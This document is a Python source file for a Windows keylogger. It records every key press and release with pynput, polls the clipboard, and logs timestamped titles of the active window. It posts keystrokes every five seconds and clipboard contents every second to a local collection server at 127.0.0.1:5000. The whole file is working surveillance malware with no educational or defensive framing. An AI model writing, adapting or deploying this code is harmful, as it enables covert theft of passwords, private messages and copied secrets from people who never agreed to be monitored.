from pynput import keyboard
import threading
import time
import requests
import pyperclip
import datetime
from win32gui import GetWindowText, GetForegroundWindow

dataVal = []


def main():
    # Spawning the thread to write to the log file every 5 seconds.
    sendKeyThread = threading.Thread(target=keySender)
    sendClipThread = threading.Thread(target=clipSender)
    sendFocusThread = threading.Thread(target=focusCapture)
    sendFocusThread.start()
    sendKeyThread.start()
    sendClipThread.start()
    with keyboard.Listener(on_press=recordPress, on_release=recordRelease) as listener:
        listener.join()


def recordPress(key):
    global dataVal
    dataVal.append(f"pressed {key}\n")

def recordRelease(key):
    global dataVal
    dataVal.append(f"released {key}\n")

def keySender():
    while True:
        global dataVal
        if len(dataVal) != 0:
            dataCopy = dataVal.copy()
            dataVal = dataVal[len(dataCopy):]
            postReq = requests.post("http://127.0.0.1:5000/write", json={"data": dataCopy})        
        time.sleep(5)

def clipSender():
    prevValue = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != prevValue and tmp_value != None:
            prevValue = tmp_value
            postReq = requests.post("http://127.0.0.1:5000/writeClip", json={"data": str(prevValue)})  
        time.sleep(1)

def timeStamp():
    dt = datetime.datetime.now()
    formatted_timestamp = dt.strftime("%Y-%m-%d-%Hh")
    return (formatted_timestamp)

def focusCapture ():
    global dataVal
    dataVal.append(f"{timeStamp()} - {GetWindowText(GetForegroundWindow())}\n")
    curWindow = GetWindowText(GetForegroundWindow())
    while True:
        temp = GetWindowText(GetForegroundWindow())
        if temp != curWindow:
            curWindow = temp
            if temp and temp != "Task Switching":
                dataVal.append(f"{timeStamp()} - {temp}\n")




if __name__=="__main__":
    main()
